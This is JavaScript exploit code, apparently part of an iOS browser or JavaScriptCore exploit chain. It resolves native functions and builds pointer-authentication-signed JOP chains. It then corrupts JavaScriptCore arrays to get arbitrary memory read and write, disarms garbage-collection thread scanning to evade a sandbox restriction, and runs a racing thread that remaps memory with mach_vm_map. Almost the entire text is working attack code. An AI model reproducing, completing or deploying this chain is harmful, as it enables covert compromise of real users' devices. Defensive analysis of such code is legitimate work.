fcall_init();
let PAGE_SIZE    = 0x4000n;
let KERN_SUCCESS = 0n;

let CALLOC = func_resolve("calloc");
let MALLOC = func_resolve("malloc");
let FREE   = func_resolve("free");

let MEMCPY = func_resolve("memcpy");
let MEMSET = func_resolve("memset");

let SLEEP    = func_resolve("sleep");
let USLEEP   = func_resolve("usleep");
let STRCMP   = func_resolve("strcmp");
let STRCPY   = func_resolve("strcpy");
let STRNCPY  = func_resolve("strncpy");
let SNPRINTF = func_resolve("snprintf");
let PRINTF   = func_resolve("printf");

let ERRNO   = func_resolve("errno");
let CLOSE   = func_resolve("close");
let EXIT    = func_resolve("exit");
let GETCHAR = func_resolve("getchar");
let GETPID  = func_resolve("getpid");
let SYSCALL = func_resolve("syscall");

let MACH_VM_ALLOCATE   = func_resolve("mach_vm_allocate");
let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
let MACH_ERROR_STRING  = func_resolve("mach_error_string");
let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");

let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");

function assert(a, b = "N/A")
{
    if (!a) {
        throw new Error(`assert failed: ${b}`)
    }
}

function ERROR(a) { throw new Error(a); }

function new_uint64_t(val = 0n)
{
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
}

function mach_task_self() { return 0x203n; }

function calloc(...args) { return fcall(CALLOC, ...args); }
function malloc(...args) { return fcall(MALLOC, ...args); }
function free(...args) { return fcall(FREE, ...args); }

function memcpy(...args) { return fcall(MEMCPY, ...args); }
function memset(...args) { return fcall(MEMSET, ...args); }

function sleep(...args) { return fcall(SLEEP, ...args); }
function usleep(...args) { return fcall(USLEEP, ...args); }
function strcmp(...args) { return fcall(STRCMP, ...args); }
function strcpy(...args) { return fcall(STRCPY, ...args); }
function strncpy(...args) { return fcall(STRNCPY, ...args); }
function snprintf(...args) { return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args); }
function printf(...args) { return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args); }

function close(...args) { return fcall(CLOSE, ...args); }
function exit(...args) { return fcall(EXIT, ...args); }
function getchar(...args) { return fcall(GETCHAR, ...args); }
function getpid(...args) { return fcall(GETPID, ...args); }
function syscall(num, ...args) { return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args); }

function mach_vm_allocate(...args) { return fcall(MACH_VM_ALLOCATE, ...args); }
function mach_vm_deallocate(...args) { return fcall(MACH_VM_DEALLOCATE, ...args); }
function mach_error_string(...args) { return fcall(MACH_ERROR_STRING, ...args); }
function mach_port_allocate(...args) { return fcall(MACH_PORT_ALLOCATE, ...args); }

let g_device_machine = 0n;
function get_device_machine()
{
    if (g_device_machine == 0n) {
        let utsname = calloc(256n, 5n);
        fcall(UNAME, utsname);
        g_device_machine = utsname + (256n * 4n);
    }

    return g_device_machine;
}

let OBJC_ALLOC       = func_resolve("objc_alloc");
let OBJC_ALLOC_INIT  = func_resolve("objc_alloc_init");
let OBJC_GETCLASS    = func_resolve("objc_getClass");
let OBJC_MSGSEND     = func_resolve("objc_msgSend");
let SEL_REGISTERNAME = func_resolve("sel_registerName");

let CFDICTIONARYCREATEMUTABLE       = func_resolve("CFDictionaryCreateMutable");
let CFDICTIONARYSETVALUE            = func_resolve("CFDictionarySetValue");
let CFNUMBERCREATE                  = func_resolve("CFNumberCreate");
let CFRELEASE                       = func_resolve("CFRelease");
let CFSHOW                          = func_resolve("CFShow");
let CFSTRINGCREATECOPY              = func_resolve("CFStringCreateCopy");
let CFSTRINGCREATEWITHCSTRING       = func_resolve("CFStringCreateWithCString");
let kCFAllocatorDefault             = uread64(func_resolve("kCFAllocatorDefault").noPAC());
let kCFStringEncodingUTF8           = 0x08000100n;
let kCFTypeDictionaryKeyCallBacks   = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();

function CFDictionaryCreateMutable(...args) { return fcall(CFDICTIONARYCREATEMUTABLE, ...args); }
function CFDictionarySetValue(...args) { return fcall(CFDICTIONARYSETVALUE, ...args); }
function CFNumberCreate(...args) { return fcall(CFNUMBERCREATE, ...args); }
function CFRelease(...args) { return fcall(CFRELEASE, ...args); }
function CFShow(...args) { return fcall(CFSHOW, ...args); }
function CFStringCreateCopy(...args) { return fcall(CFSTRINGCREATECOPY, ...args); }
function CFStringCreateWithCString(...args) { return fcall(CFSTRINGCREATEWITHCSTRING, ...args); }

function objc_alloc(class_obj) { return fcall(OBJC_ALLOC, class_obj); }
function objc_alloc_init(class_obj) { return fcall(OBJC_ALLOC_INIT, class_obj); }
function objc_getClass(class_name) { return fcall(OBJC_GETCLASS, get_cstring(class_name)); }
function objc_msgSend(...args) { return fcall(OBJC_MSGSEND, ...args); }
function sel_registerName(cstr) { return fcall(SEL_REGISTERNAME, cstr); }

let selector_evaluateScript                 = sel_registerName(get_cstring("evaluateScript:"));
let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
let selector_invocationWithMethodSignature  = sel_registerName(get_cstring("invocationWithMethodSignature:"));
let selector_invoke                         = sel_registerName(get_cstring("invoke"));
let selector_isFinished                     = sel_registerName(get_cstring("isFinished"));
let selector_methodSignatureForSelector     = sel_registerName(get_cstring("methodSignatureForSelector:"));
let selector_objectForKeyedSubscript        = sel_registerName(get_cstring("objectForKeyedSubscript:"));
let selector_release                        = sel_registerName(get_cstring("release"));
let selector_retainCount                    = sel_registerName(get_cstring("retainCount"));
let selector_setArgument_atIndex            = sel_registerName(get_cstring("setArgument:atIndex:"));
let selector_start                          = sel_registerName(get_cstring("start"));

let invoke_class   = objc_getClass("NSInvocation");
let jsc_class      = objc_getClass("JSContext");
let nsthread_class = objc_getClass("NSThread");

function create_cfstring(cstring)
{
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
}

let cfstr_boxed_arr          = create_cfstring(get_cstring("boxed_arr"));
let cfstr_control_array      = create_cfstring(get_cstring("control_array"));
let cfstr_control_array_8    = create_cfstring(get_cstring("control_array_8"));
let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
let cfstr_isNaN              = create_cfstring(get_cstring("isNaN"));
let cfstr_rw_array           = create_cfstring(get_cstring("rw_array"));
let cfstr_rw_array_8         = create_cfstring(get_cstring("rw_array_8"));
let cfstr_unboxed_arr        = create_cfstring(get_cstring("unboxed_arr"));

function create_cfstring_copy(cfstring) { return CFStringCreateCopy(kCFAllocatorDefault, cfstring); }

function object_retainCount(obj) { return objc_msgSend(obj, selector_retainCount); }

function object_release(obj) { return objc_msgSend(obj, selector_release); }

function objectForKeyedSubscript(obj, cfstr_key)
{
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
}

function evaluateScript(obj, jscript) { return objc_msgSend(obj, selector_evaluateScript, jscript); }

function methodSignatureForSelector(obj, sel) { return objc_msgSend(obj, selector_methodSignatureForSelector, sel); }

function invocationWithMethodSignature(obj, sig)
{
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
}

function setArgument_atIndex(obj, arg, idx) { return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx); }

function initWithTarget_selector_object(obj, target, sel, object)
{
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
}

function nsthread_start(obj) { return objc_msgSend(obj, selector_start); }

function setup_fcall_jopchain() {
    let jsvm_fcall_buff  = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args  = jsvm_fcall_buff + 0x200n;

    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));

    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));

    return {
        "jsvm_fcall_buff" : jsvm_fcall_buff,
        "jsvm_fcall_pc" : load_x1x3x8_args + 0x30n,
        "jsvm_fcall_args" : jsvm_fcall_args,
    };
}

let evaluateScript_invocation = 0n;
function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n)
{
    if (typeof (js_script_nsstring) === "string") {
        js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof (js_script_nsstring) === "object") {
        js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
        // in this case, it's already a CFString, so let's just copy it
        js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }

    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc   = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];


    let ctx                   = objc_alloc_init(jsc_class);
    let isnan_value           = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr       = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr        = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);

    // setup addrof prims
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr  = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value   = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr    = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter  = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);

    // setup rw64 prim
    let rw_array_addr           = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr      = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk      = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);

    // setup rw8 prim
    let rw_array_8_addr           = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr      = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk      = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);

    let signing_ctx       = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);

    let new_func_offsets        = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr   = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);

    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE)
    uwrite64(new_func_offsets_buffer + (3n * 0x8n), target_thread_arg);
    uwrite64(new_func_offsets_buffer + (5n * 0x8n), jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + (6n * 0x8n), jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + (7n * 0x8n), jsvm_fcall_args);

    if (evaluateScript_invocation == 0n) {
        let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
        evaluateScript_invocation    = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
        setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }

    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);

    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);

    return {
        "thread_handle" : nsthread,
        "js_ctx" : ctx,
        "jop_chain_info" : jop_chain_info,
        "js_script_nsstring" : js_script_nsstring,
        "rw_array_buffer_bk" : rw_array_buffer_bk,
        "control_array_buffer_bk" : control_array_buffer_bk,
        "rw_array_8_buffer_bk" : rw_array_8_buffer_bk,
        "control_array_8_buffer_bk" : control_array_8_buffer_bk,
    };
}

function js_thread_join(js_thread)
{
    let jop_chain_info     = js_thread["jop_chain_info"];
    let js_ctx             = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread           = js_thread["thread_handle"];

    // wait until the thread is finished and release it
    while (true) {
        let isFinished = objc_msgSend(nsthread, selector_isFinished);
        if (isFinished == 1n) {
            break;
        }
    }
    object_release(nsthread);

    // revert rw64 prim
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n,
             js_thread["control_array_buffer_bk"]);
    // revert rw8 prim
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n,
             js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n,
             js_thread["control_array_8_buffer_bk"]);
    // release js context
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
        object_release(js_ctx);
    }
    // release target js script
    CFRelease(js_script_nsstring);
    // free jop chain properties
    free(jop_chain_info["jsvm_fcall_buff"]);
}
let RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;

let VM_FLAGS_ANYWHERE = 1n;
let VM_FLAGS_FIXED = 0n;
let VM_FLAGS_OVERWRITE = 0x4000n;
let VM_FLAGS_RANDOM_ADDR = 8n;
let VM_INHERIT_NONE = 2n;
let VM_PROT_DEFAULT = 3n;

let PROT_READ = 0x1n;
let PROT_WRITE = 0x2n;

let MAP_SHARED = 0x1n;

let AF_INET6 = 30n;
let SOCK_DGRAM = 2n;
let IPPROTO_ICMPV6 = 58n;
let ICMP6_FILTER = 18n;

let SEEK_SET = 0n;

let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
let ACCESS = func_resolve("access");
let CONFSTR = func_resolve("confstr");
let FCNTL = func_resolve("fcntl");
let FSYNC = func_resolve("fsync");
let FILEPORT_MAKEFD = func_resolve("fileport_makefd");
let FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
let FOPEN = func_resolve("fopen");
let FCLOSE = func_resolve("fclose");
let FWRITE = func_resolve("fwrite");
let GETSOCKOPT = func_resolve("getsockopt");
let LSEEK = func_resolve("lseek");
let MACH_THREAD_SELF = func_resolve("mach_thread_self");
let MEMMEM = func_resolve("memmem");
let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
let OPEN = func_resolve("open");
let PREADV = func_resolve("preadv");
let PWRITEV = func_resolve("pwritev");
let PWRITE = func_resolve("pwrite");
let PREAD = func_resolve("pread");
let READ = func_resolve("read");
let SETSOCKOPT = func_resolve("setsockopt");
let SOCKET = func_resolve("socket");
let STRCAT = func_resolve("strcat");
let STRSTR = func_resolve("strstr");
let STRLEN = func_resolve("strlen");
let STRNCMP = func_resolve("strncmp");
let STRRCHR = func_resolve("strrchr");
let PTHREAD_SELF = func_resolve("pthread_self");
let PTHREAD_JOIN = func_resolve("pthread_join");
let WRITE = func_resolve("write");
let REMOVE = func_resolve("remove");
let ARC4RANDOM = func_resolve("arc4random");
let TASK_THREADS = func_resolve("task_threads");
let THREAD_SUSPEND = func_resolve("thread_suspend");

let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
let MACH_VM_MAP = func_resolve("mach_vm_map");
let MMAP = func_resolve("mmap");
let MLOCK = func_resolve("mlock");
let MUNLOCK = func_resolve("munlock");
let UNAME = func_resolve("uname");

let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());

function DUMP(addr, sz) {
    // fcall(local_dump, addr, sz);
}

function js_malloc(sz) {
    buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
    return uread64(mem.addrof(buff) + 0x10n);
}

function mach_thread_self() {
    return fcall(MACH_THREAD_SELF);
}

function pthread_getspecific(key) {
    return fcall(PTHREAD_GETSPECIFIC, key);
}

function pthread_self() {
    return fcall(PTHREAD_SELF);
}

function pthread_join(thr, val) {
    return fcall(PTHREAD_JOIN, thr, val);
}

function _NSGetExecutablePath(executable_path, length_ptr) {
    return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
}

function confstr(name, buf, len) {
    return fcall(CONFSTR, name, buf, len);
}

function strrchr(s, c) {
    return fcall(STRRCHR, s, c);
}

function strcat(s1, s2) {
    return fcall(STRCAT, s1, s2);
}

function strlen(s) {
    return fcall(STRLEN, s);
}

function strstr(s1, s2) {
    return fcall(STRSTR, s1, s2);
}

function strncmp(s1, s2, n) {
    return fcall(STRNCMP, s1, s2, n);
}

function socket(domain, type, protocol) {
    return fcall(SOCKET, domain, type, protocol);
}

function getsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
}

function setsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
}

function fileport_makeport(fd, port) {
    return fcall(FILEPORT_MAKEPORT, fd, port);
}

function fileport_makefd(port) {
    return fcall(FILEPORT_MAKEFD, port);
}

function memset_pattern8(buf, val, sz) {
    return fcall(MEMSET_PATTERN8, buf, val, sz);
}

function memmem(big, big_len, little, little_len) {
    return fcall(MEMMEM, big, big_len, little, little_len);
}

function access(path, mode) {
    return fcall(ACCESS, path, mode);
}

function open(path, mode) {
    return fcall(OPEN, path, mode);
}

function fopen(path, mode) {
    return fcall(FOPEN, path, mode);
}

function fclose(fd) {
    return fcall(FCLOSE, fd);
}

function fwrite(buf, sz, nitem, fd) {
    return fcall(FWRITE, buf, sz, nitem, fd);
}

function preadv(fildes, iov, iovcnt, offset) {
    return fcall(PREADV, fildes, iov, iovcnt, offset);
}

function pwritev(fildes, iov, iovcnt, offset) {
    return fcall(PWRITEV, fildes, iov, iovcnt, offset);
}

function pwrite(fildes, buff, size, offset) {
    return fcall(PWRITE, fildes, buff, size, offset);
}

function pread(fildes, buff, size, offset) {
    return fcall(PREAD, fildes, buff, size, offset);
}

function read(fd, buf, sz) {
    return fcall(READ, fd, buf, sz);
}

function write(fd, buf, sz) {
    return fcall(WRITE, fd, buf, sz);
}

function remove(path) {
    return fcall(REMOVE, path);
}

function arc4random() {
    return fcall(ARC4RANDOM);
}

function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
}

function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
}

function lseek(fildes, offset, whence) {
    return fcall(LSEEK, fildes, offset, whence);
}

function fsync(fd) {
    return fcall(FSYNC, fd);
}

function CFStringCreateWithCString(allocator, cstring, encoding) {
    return fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
}

function CFStringCreateCopy(allocator, cfstring) {
    return fcall(CFSTRINGCREATECOPY, allocator, cfstring);
}

function CFDictionarySetValue(dict, key, value) {
    return fcall(CFDICTIONARYSETVALUE, dict, key, value);
}

function CFNumberCreate(allocator, theType, valuePtr) {
    return fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
}

function IOSurfaceCreate(dict) {
    return fcall(IOSURFACECREATE, dict);
}

function IOSurfaceGetBaseAddress(surface) {
    return fcall(IOSURFACEGETBASEADDRESS, surface);
}

function IOSurfacePrefetchPages(surface) {
    return fcall(IOSURFACEPREFETCHPAGES, surface);
}

function CFRelease(obj) {
    return fcall(CFRELEASE, obj);
}

function CFShow(obj) {
    return fcall(CFSHOW, obj);
}

function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
    return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
}

function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
    return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | (max_protection << 32n), inheritance);
}

function mmap(addr, len, prot, flags, fd, offset) {
    return fcall(MMAP, addr, len, prot, flags, fd, offset);
}

function mlock(address, size) {
    return fcall(MLOCK, address, size);
}

function munlock(address, size) {
    return fcall(MUNLOCK, address, size);
}

function mach_port_deallocate(task, name) {
    return fcall(MACH_PORT_DEALLOCATE, task, name);
}

function mach_task_self() {
    return 0x203n;
}

function new_uint64_t(val=0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
}

function disable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 0n);
    // LOG("[+] gc disabled!!");
}

function enable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 1n);
    // LOG("[+] gc enabled!!");
}

function disarm_gc() {
    /*
        
        Problem:

            GC is triggering, and it calls tryCopyOtherThreadStacks -> tryCopyOtherThreadStack -> thread.getRegisters -> thread_get_state
        
            thread_get_state is banned by autobox in >=18.4 which leads to crash.

        Solution:

            To work correctly in nojit environment GC needs to scan at least the stack of current thread with call to gatherFromCurrentThread.
            It doesn't involve calling thread_get_state so it's safe to do.

            void MachineThreads::gatherConservativeRoots(...)
            {
                if (currentThreadState)
                    gatherFromCurrentThread(conservativeRoots, jitStubRoutines, codeBlocks, *currentThreadState);
                ...
                while (!tryCopyOtherThreadStacks(locker, buffer, capacity, &size, *currentThread))
                    growBuffer(size, &buffer, &capacity);

            }

            On the other hand, tryCopyOtherThreadStacks will try to iterate threads of heap.m_threadGroup and call thread_get_state.
            We can avoid it by nulling first member of heap.m_threadGroup.threads which prevents iteration and still makes tryCopyOtherThreadStacks return true.
    
    */

    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let m_threadGroup = uread64(heap + 0x198n);
    let threads = uread64(m_threadGroup);
    uwrite64(threads + 0x20n, 0x0n);
    // LOG("[+] gc disarmed");
}

disable_gc();
disarm_gc();
enable_gc();


LOG("[+] Hello from: " + mach_thread_self().hex());
LOG("[+] thread_arg: " + thread_arg.hex());

let shared_mem = thread_arg;
let free_thread_start_ptr = shared_mem;
let free_target_sync_ptr = shared_mem + 0x8n;
let free_target_size_sync_ptr = shared_mem + 0x10n;
let target_object_sync_ptr = shared_mem + 0x18n;
let target_object_offset_sync_ptr = shared_mem + 0x20n;
let go_sync_ptr = shared_mem + 0x28n;
let race_sync_ptr = shared_mem + 0x30n;

cmp8_wait_for_change(free_thread_start_ptr, 0);

let free_target = uread64(free_target_sync_ptr);
let free_target_size = uread64(free_target_size_sync_ptr);

function free_thread() {
    cmp8_wait_for_change(go_sync_ptr, 0);

    while (uread64(go_sync_ptr) != 0n) {

        // enable_gc();
        cmp8_wait_for_change(race_sync_ptr, 0);
        // disable_gc();

        let target_object = uread64(target_object_sync_ptr);
        let target_object_offset = uread64(target_object_offset_sync_ptr);

        // Allocate a new non-contiguous map entry (optionally using a memory object)
        kr = mach_vm_map(mach_task_self(),
            get_bigint_addr(free_target),
            free_target_size,
            0n,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            target_object,
            target_object_offset,
            0n,
            VM_PROT_DEFAULT,
            VM_PROT_DEFAULT,
            VM_INHERIT_NONE);

        if (kr != KERN_SUCCESS) {
            LOG("[-] mach_vm_map failed !!!");
            LOG("[+] free_target: " + free_target.hex());
            LOG("[+] target_object: " + target_object.hex());
            exit(0n);
        }

        uwrite64(race_sync_ptr, 0n);
    }

    // enable_gc();
}

free_thread();